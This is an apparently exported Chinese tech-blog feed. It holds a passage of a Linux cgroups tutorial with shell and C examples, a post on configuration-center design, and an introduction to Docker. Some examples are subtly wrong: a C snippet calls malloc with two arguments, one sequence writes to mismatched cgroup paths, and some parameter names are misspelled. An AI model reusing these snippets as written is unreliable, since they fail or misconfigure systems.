<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgexec -g subsystems:path_to_cgroup command arguments</div></pre></td></tr></table></figure>
<p>command和arguments就表示要在cgroup中执行的命令和参数<br>cgexec常用于执行临时的任务</p>
<ul>
<li>权限管理<br>与文件的权限管理类似,通过chown就可以对cgroup文件系统进行权限管理</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chown uid:gid /path/to/cgroup</div></pre></td></tr></table></figure>
<h4 id="subsystem的配置参数用法"><a href="#subsystem的配置参数用法" class="headerlink" title="subsystem的配置参数用法"></a><b>subsystem的配置参数用法</b></h4><ul>
<li>BLOCK IO资源控制<br>限额类。限额类是主要有两种策略,一种是基于完全公平队列调度（CFQ：Completely Fair Queuing）的按权重分配各个cgroup所能占用总体资源的百分比,好处是当资源空闲时可以充分利用,但只能用于最底层节点cgroup的配置；另一种则是设定资源使用上限,这种限额在各个层次的cgroup都可以配置,但这种限制较为生硬,并且容器之间依然会出现资源的竞争。<br>按比例分配块设备IO资源：<br>blkio.weight：填写100-1000的一个整数值,作为相对权重比率,作为通用的设备分配比。<br>blkio.weight_device：针对特定设备的权重比,写入格式为device_types:node_numbers weight,空格前的参数段指定设备,weight参数与blkio.weight相同并覆盖原有的通用分配比。查看一个设备的device_types:node_numbers可以使用：ls -l /dev/DEV,看到的用逗号分隔的两个数字就是。也称之为major_number:minor_number。<br>控制IO读写速度上限：<br>blkio.throttle.read_bps_device：按每秒读取块设备的数据量设定上限,格式device_types:node_numbers bytes_per_second。<br>blkio.throttle.write_bps_device：按每秒写入块设备的数据量设定上限,格式device_types:node_numbers bytes_per_second。<br>blkio.throttle.read_iops_device：按每秒读操作次数设定上限,格式device_types:node_numbers operations_per_second。<br>blkio.throttle.write_iops_device：按每秒写操作次数设定上限,格式device_types:node_numbers operations_per_second。<br>针对特定操作(read, write, sync, 或async)设定读写速度上限。<br>blkio.throttle.io_serviced：针对特定操作按每秒操作次数设定上限,格式device_types:node_numbers operation operations_per_second。<br>blkio.throttle.io_service_bytes：针对特定操作按每秒数据量设定上限,格式device_types:node_numbers operation bytes_per_second。<br>统计与监控。以下内容都是只读的状态报告,通过这些统计项更好地统计、监控进程的io情况。<br>blkio.reset_stats：重置统计信息,写入一个int值即可。<br>blkio.time：统计cgroup对设备的访问时间,按格式device_types:node_numbers milliseconds读取信息即可,以下类似。<br>blkio.io_serviced：统计cgroup对特定设备的IO操作,包括read、write、sync及async次数,格式device_types:node_numbers operation number。<br>blkio.sectors：统计cgroup对设备扇区访问次数,格式 device_types:node_numbers sector_count。<br>blkio.io_service_bytes：统计cgroup对特定设备IO操作,包括read、write、sync及async的数据量,格式device_types:node_numbers operation bytes。<br>blkio.io_queued：统计cgroup的队列中对IO操作,包括read、write、sync及async的请求次数,格式number operation。<br>blkio.io_service_time：统计cgroup对特定设备的IO操作,包括read、write、sync及async时间(单位为ns),格式device_types:node_numbers operation time。<br>blkio.io_merged：统计cgroup 将 BIOS 请求合并到IO操作,包括read、write、sync及async请求的次数,格式number operation。<br>blkio.io_wait_time：统计cgroup在各设​​​备​​​中各类型​​​IO操作,包括read、write、sync及async在队列中的等待时间​(单位ns),格式device_types:node<em>numbers operation time。<br><strong>blkio.</strong>recursive</em>*：各类型的统计都有一个递归版本,Docker中使用的都是这个版本。获取的数据与非递归版本是一样的,但是包括cgroup所有层级的监控数据</li>
</ul>
<p>我们的模拟命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo dd if=/dev/sda1 of=/dev/null</div></pre></td></tr></table></figure></p>
<p>通过iotop命令我们可以看到相关的IO速度是55MB/s(vm)<br>之后，我们先创建一个blkio（块设备IO）的cgroup，并把读IO限制到1MB/s，并把前面那个dd命令的pid放进去(注：8:0 是设备号，你可以通过ls -l /dev/sda1获得)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir /sys/fs/cgroup/blkio/cg1</div><div class="line">echo &apos;8:0 1048576&apos;  &gt; /sys/fs/cgroup/blkio/cgl/blkio.throttle.read_bps_device</div><div class="line">echo 8128 &gt; /sys/fs/cgroup/blkio/haoel/tasks</div></pre></td></tr></table></figure></p>
<p>再用iotop命令，你马上就能看到读速度被限制到了1MB/s左右</p>
<ul>
<li>CPU资源控制<br>CPU资源的控制也有两种策略,一种是完全公平调度（CFS：Completely Fair Scheduler）策略,提供了限额和按比例分配两种方式进行资源控制；另一种是实时调度（Real-Time Scheduler）策略,针对实时进程按周期分配固定的运行时间。配置时间都以微秒（µs）为单位,文件名中用us表示。<br>CFS调度策略配置：<br>设定CPU使用周期使用时间上限。<br>cpu.cfs_period_us：设定周期时间,必须与cfs_quota_us配合使用。<br>cpu.cfs_quota_us：设定周期内最多可使用的时间。这里的配置指task对单个cpu的使用上限,若cfs_quota_us是cfs_period_us的两倍,就表示在两个核上完全使用。数值范围为1000-1000,000（微秒）。<br>cpu.stat：统计信息,包含nr_periods（表示经历了几个cfs_period_us周期）、nr_throttled（表示task被限制的次数）及throttled_time（表示task被限制的总时长）。<br>按权重比例设定CPU的分配。<br>cpu.shares：设定一个整数,必须大于等于2,表示相对权重,最后除以权重总和算出相对比例,按比例分配CPU时间。如cgroup A设置100,cgroup B设置300,那么cgroup A中的task运行25%的CPU时间。对于一个4核CPU的系统来说,cgroup A中的task可以100%占有某一个CPU,这个比例是相对整体的一个值。<br>RT调度策略下的配置：<br>实时调度策略与公平调度策略中的按周期分配时间的方法类似,也是在周期内分配一个固定的运行时间。<br>cpu.rt_period_us：设定周期时间。<br>cpu.rt_runtime_us：设定周期中的运行时间</li>
</ul>
<p>假设，我们有个非常耗cpu的程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int i = 0;</div><div class="line">    for(;;) i++;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>执行后，可以top看到进程pid为3529</p>
<p>在/sys/fs/cgroup/cpu下建立cg1的group<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us </div><div class="line">-1</div><div class="line">echo 20000 &gt; /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us</div><div class="line"># 将进程的pid加入到cgroup中</div><div class="line">echo 3529 &gt;&gt; /sys/fs/cgroup/cpu/haoel/tasks</div></pre></td></tr></table></figure></p>
<p>之后，在top中看到cpu下降了20%</p>
<p>下边代码是一个线程示例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">#define _GNU_SOURCE         /* See feature_test_macros(7) */</div><div class="line"> </div><div class="line">#include &lt;pthread.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/syscall.h&gt;</div><div class="line"> </div><div class="line"> </div><div class="line">const int NUM_THREADS = 5;</div><div class="line"> </div><div class="line">void *thread_main(void *threadid)</div><div class="line">&#123;</div><div class="line">    /* 把自己加入cgroup中（syscall(SYS_gettid)为得到线程的系统tid） */</div><div class="line">    char cmd[128];</div><div class="line">    sprintf(cmd, &quot;echo %ld &gt;&gt; /sys/fs/cgroup/cpu/haoel/tasks&quot;, syscall(SYS_gettid));</div><div class="line">    system(cmd); </div><div class="line">    sprintf(cmd, &quot;echo %ld &gt;&gt; /sys/fs/cgroup/cpuset/haoel/tasks&quot;, syscall(SYS_gettid));</div><div class="line">    system(cmd);</div><div class="line"> </div><div class="line">    long tid;</div><div class="line">    tid = (long)threadid;</div><div class="line">    printf(&quot;Hello World! It&apos;s me, thread #%ld, pid #%ld!\n&quot;, tid, syscall(SYS_gettid));</div><div class="line">     </div><div class="line">    int a=0; </div><div class="line">    while(1) &#123;</div><div class="line">        a++;</div><div class="line">    &#125;</div><div class="line">    pthread_exit(NULL);</div><div class="line">&#125;</div><div class="line">int main (int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">    int num_threads;</div><div class="line">    if (argc &gt; 1)&#123;</div><div class="line">        num_threads = atoi(argv[1]);</div><div class="line">    &#125;</div><div class="line">    if (num_threads&lt;=0 || num_threads&gt;=100)&#123;</div><div class="line">        num_threads = NUM_THREADS;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    /* 设置CPU利用率为50% */</div><div class="line">    mkdir(&quot;/sys/fs/cgroup/cpu/haoel&quot;, 755);</div><div class="line">    system(&quot;echo 50000 &gt; /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us&quot;);</div><div class="line"> </div><div class="line">    mkdir(&quot;/sys/fs/cgroup/cpuset/haoel&quot;, 755);</div><div class="line">    /* 限制CPU只能使用#2核和#3核 */</div><div class="line">    system(&quot;echo \&quot;2,3\&quot; &gt; /sys/fs/cgroup/cpuset/haoel/cpuset.cpus&quot;);</div><div class="line"> </div><div class="line">    pthread_t* threads = (pthread_t*) malloc (sizeof(pthread_t)*num_threads);</div><div class="line">    int rc;</div><div class="line">    long t;</div><div class="line">    for(t=0; t&lt;num_threads; t++)&#123;</div><div class="line">        printf(&quot;In main: creating thread %ld\n&quot;, t);</div><div class="line">        rc = pthread_create(&amp;threads[t], NULL, thread_main, (void *)t);</div><div class="line">        if (rc)&#123;</div><div class="line">            printf(&quot;ERROR; return code from pthread_create() is %d\n&quot;, rc);</div><div class="line">            exit(-1);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    /* Last thing that main() should do */</div><div class="line">    pthread_exit(NULL);</div><div class="line">    free(threads);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li><p>cpu资源报告<br>这个子系统的配置是cpu子系统的补充,提供CPU资源用量的统计,时间单位都是纳秒。<br>cpuacct.usage：统计cgroup中所有task的cpu使用时长。<br>cpuacct.stat：统计cgroup中所有task的用户态和内核态分别使用cpu的时长。<br>cpuacct.usage_percpu：统计cgroup中所有task使用每个cpu的时长</p>
</li>
<li><p>cpu绑定<br>为task分配独立CPU资源的子系统,参数较多,这里只选讲两个必须配置的参数,同时Docker中目前也只用到这两个。<br>cpuset.cpus：在这个文件中填写cgroup可使用的CPU编号,如0-2,16代表 0、1、2和16这4个CPU。<br>cpuset.mems：与CPU类似,表示cgroup可使用的memory node</p>
</li>
<li><p>限制task对device的使用<br>设备黑/白名单过滤<br>devices.allow：允许名单,语法type device_types:node_numbers access type。<br>type有三种类型：b（块设备）、c（字符设备）、a（全部设备）<br>access也有三种方式：r（读）、w（写）、m（创建）<br>devices.deny：禁止名单,语法格式同上。<br>统计报告<br>devices.list：报告为这个cgroup中的task设定访问控制的设备</p>
</li>
<li><p>暂停/恢复cgroup中的task<br>只有一个属性,表示进程的状态,把task放到freezer所在的cgroup,再把state改为FROZEN,就可以暂停进程。不允许在cgroup处于FROZEN状态时加入进程。<br>freezer.state包括如下三种状态： -FROZEN 停止。-FREEZING 正在停止,这个是只读状态,不能写入这个值。-THAWED 恢复</p>
</li>
<li><p>内存资源管理</p>
</li>
</ul>
<p>限额类：<br>memory.limit_bytes：强制限制最大内存使用量,单位有k、m、g三种,填-1则代表无限制。<br>memory.soft_limit_bytes：软限制,只有比强制限制设置的值小时才有意义。当整体内存紧张的情况下,task获取的内存就被限制在软限制额度之内,以保证不会有太多进程因内存挨饿。可以看到,加入了内存的资源限制并不代表没有资源竞争。<br>memory.memsw.limit_bytes：设定最大内存与swap区内存之和的用量限制。<br>报警与自动控制：<br>memory.oom_control：改参数填0或1,0表示开启,当cgroup中的进程使用资源超过界限时立即杀死进程,1表示不启用。默认情况下,包含memory子系统的cgroup都启用。当oom_control不启用时,实际使用内存超过界限时进程会被暂停直到有空闲的内存资源。<br>统计与监控类：<br>memory.usage_bytes：报告该cgroups中进程使用的当前中总内存用量（以字节为单位）。<br>memory.max_usage_bytes：报告该cgroups中进程使用的最大内存使用量。<br>memory.failcnt：报告内存达到在memory.limit_in_bytes设定的限制值次数。<br>memory.stat：包含大量的内存统计数据。<br>cache：页缓存,包括​​tmpfs,单位为字节。<br>rss：匿名和swap,不包括tmpfs,单位为字节。​<br>mapped_file：memory-mapped映射的文件大小,包括tmpfs,单位为字节。<br>pgpgin：存入内存中的页数。<br>pgpgout：从内存中读出页数。<br>swap：swap用量,单位为字节。<br>active_anon：在活跃的最近最少使用（least-recently-used,LRU）列表中的匿名和swap缓存,包括tmpfs,单位为字节。<br>inactive_anon：不活跃的LRU列表中的匿名和swap缓存,包括tmpfs,单位为字节。<br>active_file：活跃LRU列表中的file-backed内存,以字节为单位。<br>inactive_file：不活跃LRU列表中的file-backed内存,以字节为单位。<br>unevictable：无法再生的内存,以字节为单位。<br>hierarchical_memory_limit：包含memory cgroup的层级的内存限制,单位为字节。<br>hierarchical_memsw_limit：包含memory cgroup的层级的内存加swap限制,单位为字节</p>
<p>下面是一个限制内存的示例(代码是个死循环，其它不断的分配内存，每次512个字节，每次休息一秒)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"> </div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int size = 0;</div><div class="line">    int chunk_size = 512;</div><div class="line">    void *p = NULL;</div><div class="line"> </div><div class="line">    while(1) &#123;</div><div class="line"> </div><div class="line">        if ((p = malloc(p, chunk_size)) == NULL) &#123;</div><div class="line">            printf(&quot;out of memory!!\n&quot;);</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">        memset(p, 1, chunk_size);</div><div class="line">        size += chunk_size;</div><div class="line">        printf(&quot;[%d] - memory is allocated [%8d] bytes \n&quot;, getpid(), size);</div><div class="line">        sleep(1);</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>之后，我们在另一个终端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># 创建memory cgroup</div><div class="line">$ mkdir /sys/fs/cgroup/memory/haoel</div><div class="line">$ echo 64k &gt; /sys/fs/cgroup/memory/haoel/memory.limit_in_bytes</div><div class="line"> </div><div class="line"># 把上面的进程的pid加入这个cgroup</div><div class="line">$ echo [pid] &gt; /sys/fs/cgroup/memory/haoel/tasks</div></pre></td></tr></table></figure>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><b>总结</b></h4><p>内核对cgroups的支持已经较为完善,但是依旧有许多工作需要完善。如网络方面目前是通过TC（Traffic Controller）来控制,未来需要统一整合；资源限制并没有解决资源竞争,在各自限制之内的进程依旧存在资源竞争,优先级调度方面依旧有很大的改进空间</p>
<p>ref</p>
<p><a href="http://70data.net/1131.html" target="_blank" rel="external">Docker学习笔记-Linux cgroups</a><br><a href="https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/6/html-single/Resource_Management_Guide/index.html" target="_blank" rel="external">Reahat Resource Management Guide</a><br><a href="http://coolshell.cn/articles/17049.html" target="_blank" rel="external">Docker基础技术：Linux CGroup</a></p>
<p>t1ger整理于2016.11.25</p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;cgroup是什么&quot;&gt;&lt;a href=&quot;#cgroup是什么&quot; class=&quot;headerlink&quot; title=&quot;cgroup是什么&quot;&gt;&lt;/a&gt;&lt;b&gt;cgroup是什么&lt;/b&gt;&lt;/h4&gt;&lt;p&gt;Linux CGroup全称Linux Control Group,L
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置中心那点事</title>
    <link href="https://t1ger.github.io/2016/11/23/%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E9%82%A3%E7%82%B9%E4%BA%8B/"/>
    <id>https://t1ger.github.io/2016/11/23/配置中心那点事/</id>
    <published>2016-11-23T05:12:05.000Z</published>
    <updated>2016-11-23T09:46:08.971Z</updated>
    
    <content type="html"><![CDATA[<h4 id="配置中心怎么做"><a href="#配置中心怎么做" class="headerlink" title="配置中心怎么做"></a><b>配置中心怎么做</b></h4><ul>
<li>配置分发，实现有两种方式<br>推：实时性变更，需要应用和配置中心保持长连接，复杂度高<br>拉：实时性相对差，没有增量更新机制会增加配置中心压力，复杂度低</li>
<li>订阅和发布<br>支持配置变更通知，如果是推送，server把每次变更实时发送给订阅客户端<br>如果是拉取，则通过比较client和server的数据md5来实现有效变更通知。server会下发数据和md5给client,client请求的时候会带上md5,假如md5变化，则server重新下发，否则无需变更，返回”无变更”</li>
<li>多环镜、集群配置管理<br>同一份程序在不同的环境（开发，测试，生产）、不同的集群（如不同的数据中心）经常需要有不同的配置，所以需要有完善的环境、集群配置管理</li>
<li>权限控制和操作审计：配置能改变程序的行为,需要有完善的权限控制，以防错误的配置引起的故障。变更操作都要有审计日志，可以方便的追踪问题</li>
<li>版本管理<br>所有的配置发布都有版本概念，从而可以方便的支持配置的回滚</li>
<li>支持灰度发布<br>支持配置的灰度发布，比如点了发布后，只对部分应用实例生效，等观察一段时间没问题后再推给所有应用实例,两种解决方案：<br>a.配置项增加一个host属性，表示这个配置项只“发布”给某些IP<br>b.定义一个优先级，客户端优先加载本地配置文件，这样如果某些机器上的应用需要特殊配置，那么可以采用老的方式上去修改其本地配置文件</li>
<li>支持降级<br>非核心服务降级开关。发生问题时，降级服务的非核心服务</li>
<li>同时支持web页面和Restful API接口</li>
<li>支持多语言，支持php这种无状态语言</li>
<li>支持容错性，当server出现问题时，不影响client的运行</li>
<li>支持本地缓存，减少每次获取配置项时与server的网络消耗，仅server更新时通知client</li>
</ul>
<h4 id="客户端怎么支持"><a href="#客户端怎么支持" class="headerlink" title="客户端怎么支持"></a><b>客户端怎么支持</b></h4><ul>
<li>配合配置中心的推送，在参数变化时调用客户端自行实现的回调接口，不需要重启应用</li>
<li>支持环境变量，JVM启动参数，配置文件，配置中心等多种来源按优先级互相覆盖，并有接口暴露最后的参数选择</li>
<li>配置文件中支持多套profile，如开发，单元测试，集成测试，生产</li>
</ul>
<h4 id="开源解决方案现状"><a href="#开源解决方案现状" class="headerlink" title="开源解决方案现状"></a><b>开源解决方案现状</b></h4><ul>
<li>淘宝的<a href="">Diamond</a></li>
<li>携程开源的<a href="https://github.com/ctripcorp/apollo" target="_blank" rel="external">Applo</a>，支持Java，其他语言通过Http支持</li>
<li>个人开源的<a href="https://github.com/knightliao/disconf/tree/master/disconf-web" target="_blank" rel="external">disconf</a>，只支持Java＋Spring</li>
<li>360的<a href="https://github.com/Qihoo360/QConf" target="_blank" rel="external">Qconf</a>，基于zk，特色是基于Agent模式的多语言支持。但服务端也没有界面、灰度、预案什么的，直接通过API操作ZK而已</li>
<li>个人开源的<a href="https://github.com/hengyunabc/xdiamond" target="_blank" rel="external">xdiamond</a></li>
<li>个人开源的<a href="https://github.com/cncduLee/zk-ucc" target="_blank" rel="external">zk-ucc</a></li>
<li>个人开源的<a href="https://github.com/xuxueli/xxl-conf" target="_blank" rel="external">xxlconf</a></li>
<li>个人开源的<a href="https://github.com/ihaolin/diablo" target="_blank" rel="external">diablo</a></li>
<li><a href="https://github.com/coreos/etcd" target="_blank" rel="external">etcd</a></li>
<li><a href="https://zookeeper.apache.org" target="_blank" rel="external">zookeeper</a></li>
<li><a href="https://www.consul.io/" target="_blank" rel="external">consul</a></li>
<li><a href="https://github.com/kelseyhightower/confd" target="_blank" rel="external">confd</a></li>
<li><a href="http://www.cfg4j.org" target="_blank" rel="external">cfg4j</a></li>
<li><a href="https://github.com/melin/super-diamond" target="_blank" rel="external">super-diamond</a> ,已停止更新</li>
</ul>
<p>开源之外呢？<br>应该说最好的配置中心还是在各个互联网公司的基础架构部里，虽然不是完美，虽然修修补补，常见的两种玩法</p>
<ul>
<li><p>一种玩法是基于zk和etcd，一般支持界面和api,用数据库来保存版本历史，预案，走流程,最后下发到zk或etcd这种有推送能力的存储里（服务注册本身也是用zk或etcd，选型就一块了）。客户端都直接和zk或etcd打交道<br>灰度发布麻烦些，其中一种实现是同时发布一个可接收的IP列表，客户端监听到配置节点变化时，对比一下自己是否属于该列表<br>PHP这种无状态的语言和其他zk/etcd不支持的语言，只好自己在客户端的机器上起一个Agent来监听变化，再写到配置文件或Share Memory了</p>
</li>
<li><p>另一种玩法是基于运维自动化的配置文件的推送，一样有数据库与界面或API来管理配置，下发时生成配置文件，基于各种运维自动化工具如Puppet，Ansible推送到每个客户端。而应用则定时重新读取这个外部的配置文件</p>
</li>
</ul>
<p>ref<br><a href="http://jm.taobao.org/2016/09/28/an-article-about-config-center/" target="_blank" rel="external">一篇好TM长的关于配置中心的文章</a><br><a href="http://calvin1978.blogcn.com/articles/serviceconfig.html" target="_blank" rel="external">服务化体系之－配置中心，在ZK或etcd之外</a><br><a href="http://vernonzheng.com/2015/02/09/%E5%BC%80%E6%BA%90%E5%88%86%E5%B8%83%E5%BC%8F%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E9%80%89%E5%9E%8B/" target="_blank" rel="external">开源分布式配置中心选型</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;配置中心怎么做&quot;&gt;&lt;a href=&quot;#配置中心怎么做&quot; class=&quot;headerlink&quot; title=&quot;配置中心怎么做&quot;&gt;&lt;/a&gt;&lt;b&gt;配置中心怎么做&lt;/b&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;配置分发，实现有两种方式&lt;br&gt;推：实时性变更，需要应用和配置中心保持长连
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Docker初体验-基础入门指北</title>
    <link href="https://t1ger.github.io/2016/11/21/Docker%E5%88%9D%E4%BD%93%E9%AA%8C-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/"/>
    <id>https://t1ger.github.io/2016/11/21/Docker初体验-基础入门指北/</id>
    <published>2016-11-21T10:08:35.000Z</published>
    <updated>2016-11-22T04:00:20.063Z</updated>
    
    <content type="html"><![CDATA[<h4 id="docker是什么"><a href="#docker是什么" class="headerlink" title="docker是什么"></a><b>docker是什么</b></h4><p>docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口</p>
<h4 id="docker做什么"><a href="#docker做什么" class="headerlink" title="docker做什么"></a><b>docker做什么</b></h4><p>在docker中，你可以将你的程序分为不同的基础部分，对于每一个基础部分都可以当做一个应用程序来管理<br>docker能够帮助你快速地测试、快速地编码、快速地交付，并且缩短你从编码到运行应用的周期<br>docker使用轻量级的容器虚拟化平台，并且结合工作流和工具，来帮助你管理、部署你的应用程序</p>
<h4 id="docker-vs-VM"><a href="#docker-vs-VM" class="headerlink" title="docker vs VM"></a><b>docker vs VM</b></h4><p>VMs = Server + Host OS + Hypervisor（Type2）+ Guest OS + Bins/Libs +(App A | App A’ | App B)<br>Containers = Server + Host OS + Docker Engine + ((Bins/Libs +App A | App A’) | (Bins/Libs +App B))<br>Docker去除了传统虚机的Guest OS层，免除了对应overhead，Docker Engine 替代了VM中的Guest OS + Hypervisor（Type2)层</p>
<h4 id="docker架构"><a href="#docker架构" class="headerlink" title="docker架构"></a><b>docker架构</b></h4><p>docker是CS架构，主要由下面三部分组成：<br>docker daemon: 运行在宿主机上，docker守护进程，用户通过docker client(docker命令)与docker daemon交互<br>docker client: docker 命令行工具，是用户使用docker的主要方式，docker client与docker daemon通信并将结果返回给用户，docker client也可以通过socket或者RESTful api访问远程的docker daemon<br>docker hub/registry: 共享和管理docker镜像，用户可以上传或者下载上面的镜像，官方地址为 <a href="https://registry.hub.docker.com" target="_blank" rel="external">https://registry.hub.docker.com</a> ,也可以搭建自己私有的docker registry</p>
<h4 id="docker技术术语"><a href="#docker技术术语" class="headerlink" title="docker技术术语"></a><b>docker技术术语</b></h4><p>docker的几个技术：namespace,cgroups,veth,bridge,copy-on-write,image,container<br>其中namespace和cgroup是其核心技术,我们主要来介绍这两个</p>
<h4 id="a-namespace"><a href="#a-namespace" class="headerlink" title="a. namespace"></a><b>a. namespace</b></h4><p>负责隔离资源，它让进程拥有独立的进程号，网络，文件系统等，不同的namespace下的进程互不可见，目前的Docker可以通过exec子命令直接切换到进程所在的namespace<br>docker使用到的命名空间有:</p>
<ul>
<li>pid命名空间: 使用在进程隔离(PID: Process ID)</li>
<li>net命名空间: 使用在管理网络接口(NET: Networking)</li>
<li>ipc命名空间: 使用在管理进程间通信资源 (IPC: InterProcess Communication)</li>
<li>mnt命名空间: 使用在管理挂载点 (MNT: Mount)</li>
<li>uts命名空间: 使用在隔离内核和版本标识 (UTS: Unix Timesharing System)</li>
</ul>
<h4 id="b-cgroups"><a href="#b-cgroups" class="headerlink" title="b. cgroups"></a><b>b. cgroups</b></h4><p>cgroup负责限制资源,主要体现在cpu、内存、磁盘</p>
<p><b>CPU子系统</b><br>cgroups提供了三种限制CPU资源的方式：cpuset， cpuquota和cpushares</p>
<ul>
<li><p>cpuset可以限制进程使用的cpu核数，通过cpuset/cpuset.cpus来管理，相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpuset-cpus 0 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
<li><p>cpuquota以时间片的使用率来限制CPU资源，要比cpuset的细粒度大一些，只需要设置一个相对100000的值就可以达到限制一个百分比的效果, 通过 cpu/cpu.cfs_period_us （配置时间片单位，默认为100000）和 cpu/cpu.cfs_quota_us (时间片占比)两个文件来管理,相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpu-quota 50000 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
<li><p>cpushares根据权重来分配CPU资源，比如如果只有一个进程权重为100，那么进程可以使用100%的CPU资源，如果有两个进程且权重都是100，那么每个进程可以使用50%的CPU资源 , 通过 cpu/cpu.shares 来管理，相应的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run --cpu-shares 1024 -d --name apache apache</div></pre></td></tr></table></figure>
</li>
</ul>
<p><b>内存子系统</b></p>
<ul>
<li>cgroups对内存的限制包括物理内存和swap，当进程使用内存达到上限时会被kill，关于内存限制的文件如下：<br>memory.limit_in_bytes memory.soft_limit_in_bytes memory.memsw.limit_in_byte,需要注意的一点是docker默认会将swap的限制设置为2倍内存，实际使用的内存可能会大于 -m 设置的内存大小,相应的docker命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -m 100m -d --name apache apache</div></pre></td></tr></table></figure>
</li>
</ul>
